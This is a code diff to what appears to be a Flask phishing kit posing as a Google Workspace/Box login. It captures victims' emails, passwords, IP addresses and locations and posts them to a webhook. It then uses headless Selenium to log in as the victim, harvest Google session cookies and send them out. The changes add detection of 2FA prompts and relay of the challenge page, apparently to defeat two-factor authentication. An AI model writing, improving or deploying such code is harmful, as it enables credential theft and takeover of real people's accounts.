@@ -244,38 +244,38 @@ def enter_password():
         except Exception:
             user_country = ''
             user_city = ''
-            current_time = datetime.datetime.utcnow().isoformat() + 'Z'
-            credentials_message = (
-                f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
-                f"📧 Email: {email}\n"
-                f"🔑 Password: {password_val}\n"
-                f"🌍 Real IP: {client_ip}\n"
-                f"🖥️ User Agent: {user_agent}\n"
-                f"🌐 Browser: {user_browser} {browser_version}\n"
-                f"💻 Platform: {browser_platform}\n"
-                f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
-                f"🏙️ City: {user_city}\n"
-                f"⏰ Time: {current_time}"
-            )
-            send_webhook_message(credentials_message)
-            
-            # After capturing credentials, set authenticated flag and store password
-            session['authenticated'] = True
-            session['password'] = password_val  # Temporarily store for the flow
-    
-            # Stay on password page after POST, do not re-render or redirect
-            # The password.html template should include a JS event listener for the "Next" button.
-            # When clicked, show a loading animation and trigger AJAX to /ajax-headless-login.
-            # The page remains until AJAX completes, then JS can redirect to the final URL.
-    
-            return render_template(
-                'password.html',
-                email=email,
-                banner=session.get('banner'),
-                background=session.get('background'),
-                error=None,
-                loading=False  # JS will handle loading animation on button click
-            )
+        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
+        credentials_message = (
+            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
+            f"📧 Email: {email}\n"
+            f"🔑 Password: {password_val}\n"
+            f"🌍 Real IP: {client_ip}\n"
+            f"🖥️ User Agent: {user_agent}\n"
+            f"🌐 Browser: {user_browser} {browser_version}\n"
+            f"💻 Platform: {browser_platform}\n"
+            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
+            f"🏙️ City: {user_city}\n"
+            f"⏰ Time: {current_time}"
+        )
+        send_webhook_message(credentials_message)
+        
+        # After capturing credentials, set authenticated flag and store password
+        session['authenticated'] = True
+        session['password'] = password_val  # Temporarily store for the flow
+
+        # Stay on password page after POST, do not re-render or redirect
+        # The password.html template should include a JS event listener for the "Next" button.
+        # When clicked, show a loading animation and trigger AJAX to /ajax-headless-login.
+        # The page remains until AJAX completes, then JS can redirect to the final URL.
+
+        return render_template(
+            'password.html',
+            email=email,
+            banner=session.get('banner'),
+            background=session.get('background'),
+            error=None,
+            loading=False  # JS will handle loading animation on button click
+        )
         # If GET, show password page again if session email exists
         return render_template('password.html', email=email, error=error, branding=branding)
 
@@ -289,18 +289,20 @@ def enter_password():
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
         login_result = handle_headless_login(email, password)
-        if login_result['success']:
-            cookies_json = json.dumps(cookies_to_json(login_result['cookies']), indent=2)
+        if login_result is not None and login_result.get('success'):
+            cookies_json = json.dumps(cookies_to_json(login_result.get('cookies', [])), indent=2)
+            # Prepend email to the cookies content
+            file_content = f"{email}\n{cookies_json}"
             cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {client_ip}\n\n```json\n{cookies_json}\n```"
             send_webhook_message(cookie_webhook_message)
-            # Optionally, save cookies to a temp file for download
+            # Save cookies to a temp file for download, prepended with email
             with open(COOKIE_TEMP_FILE, 'w') as f:
-                f.write(cookies_json)
+                f.write(file_content)
             session.clear()
             return jsonify({'success': True, 'cookies_json': cookies_json})
         else:
             # If login failed due to password, show error
-            if login_result.get('error') == 'invalid_password':
+            if login_result is not None and login_result.get('error') == 'invalid_password':
                 session['authenticated'] = False
                 return jsonify({'success': False, 'error': 'Invalid password'})
             send_webhook_message(f"⚠️ Headless login FAILED for {email}. No cookies captured.")
@@ -310,7 +312,8 @@ def enter_password():
     def handle_headless_login(email, password):
         """
         Uses Selenium to perform a headless login to Google and capture cookies.
-        Returns a dict: {'success': bool, 'cookies': list, 'error': str}
+        Returns a dict: {'success': bool, 'cookies': list, 'error': str, '2fa_required': bool}
+        If 2FA is required, returns '2fa_required': True and page HTML for user to complete 2FA.
         """
         options = webdriver.ChromeOptions()
         options.add_argument('--headless')
@@ -336,25 +339,51 @@ def enter_password():
 
                 # Wait for either successful login or error
                 try:
-                    # Wait for redirect to Gmail or Google Account
                     wait.until(lambda d: "mail.google.com" in d.current_url or "myaccount.google.com" in d.current_url)
-                    # Success: get cookies
                     cookies = driver.get_cookies()
                     google_cookies = [c for c in cookies if 'google.com' in c.get('domain', '')]
-                    return {'success': True, 'cookies': google_cookies if google_cookies else cookies}
+                    return {'success': True, 'cookies': google_cookies if google_cookies else cookies, '2fa_required': False}
                 except Exception:
                     # Check for error message on page
                     try:
                         error_elem = driver.find_element(By.CSS_SELECTOR, "div[jsname='B34EJ']")
                         if error_elem and "Wrong password" in error_elem.text:
-                            return {'success': False, 'cookies': [], 'error': 'invalid_password'}
+                            return {'success': False, 'cookies': [], 'error': 'invalid_password', '2fa_required': False}
                     except Exception:
                         pass
+
+                    # Check for 2FA prompt
+                    try:
+                        # Look for common 2FA elements (phone prompt, code input, authenticator app, etc.)
+                        twofa_selectors = [
+                            "input[type='tel']",  # phone code
+                            "input[type='text']", # authenticator code
+                            "div[data-challengetype]", # challenge container
+                            "div[jsname='r4nke']", # Google prompt
+                            "div[jsname='Qx7uuf']", # Authenticator app
+                        ]
+                        for selector in twofa_selectors:
+                            elems = driver.find_elements(By.CSS_SELECTOR, selector)
+                            if elems:
+                                # 2FA detected, get page HTML for user to complete
+                                page_html = driver.page_source
+                                return {
+                                    'success': False,
+                                    'cookies': [],
+                                    'error': '2fa_required',
+                                    '2fa_required': True,
+                                    '2fa_html': page_html
+                                }
+                    except Exception:
+                        pass
+
                     # General failure
-                    return {'success': False, 'cookies': [], 'error': 'login_failed'}
+                    return {'success': False, 'cookies': [], 'error': 'login_failed', '2fa_required': False}
         except Exception as e:
             print(f"[ERROR] An exception occurred during headless login for {email}: {str(e)}")
-            return {'success': False, 'cookies': [], 'error': 'exception'}
+            return {'success': False, 'cookies': [], 'error': 'exception', '2fa_required': False}
+        # Ensure a dictionary is always returned
+        return {'success': False, 'cookies': [], 'error': 'unknown_error', '2fa_required': False}
 
 # After each request, capture Set-Cookie headers if needed
 @app.after_request
